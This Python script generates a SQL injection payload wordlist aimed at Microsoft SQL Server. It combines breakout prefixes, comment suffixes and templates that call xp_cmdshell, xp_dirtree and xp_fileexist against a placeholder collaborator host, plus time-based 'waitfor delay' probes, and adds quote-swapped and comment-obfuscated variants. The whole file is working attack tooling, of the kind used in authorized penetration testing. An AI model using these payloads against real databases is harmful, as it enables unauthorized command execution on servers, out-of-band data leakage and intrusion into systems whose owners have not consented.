prefixes = [
    # '',
    ';',
    '"',
    '")',
    '"))',
    '")))',
    ')',
    '))',
    ')))'
]

logicalOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    # '',
    '--',
    '/*'
]

templates = [
    '; exec master..xp_dirtree "//{collaborator}/a"',
    '; exec master..xp_cmdshell "ping {collaborator}"',
    '; exec master..xp_fileexist  "//{collaborator}/a"',
    ' waitfor delay "0:0:{time}"'
]

stringConcatinationOperators = [
    ['"+', '+"'],
    ['"+(', ')+"'],
    ['+ ', ''],
    ['+(', ')']
]

# injection via concatinations TODO!
# def generate_quick():
#     wordlist = []
#     for concat in concats:
#         for template in templates:
#             pass
#     wordlist = list(set(wordlist))
#     return wordlist

# injection via operators + concatinations
def generate():
    wordlist = []
    for prefix in prefixes:
        # for sqlOperator in sqlOperators:
        for template in templates:
            for suffix in suffixes:
                # word = prefix + sqlOperator + template + suffix
                word = prefix + template + suffix
                if word [0] == ' ':
                    word = word [1:]
                wordlist.append(word)
                wordlist.append(word.replace('"', '\''))
                word = word.replace(' ', '/**/')
                wordlist.append(word)
                wordlist.append(word.replace('"', '\''))

    wordlist = list(set(wordlist))
    return wordlist
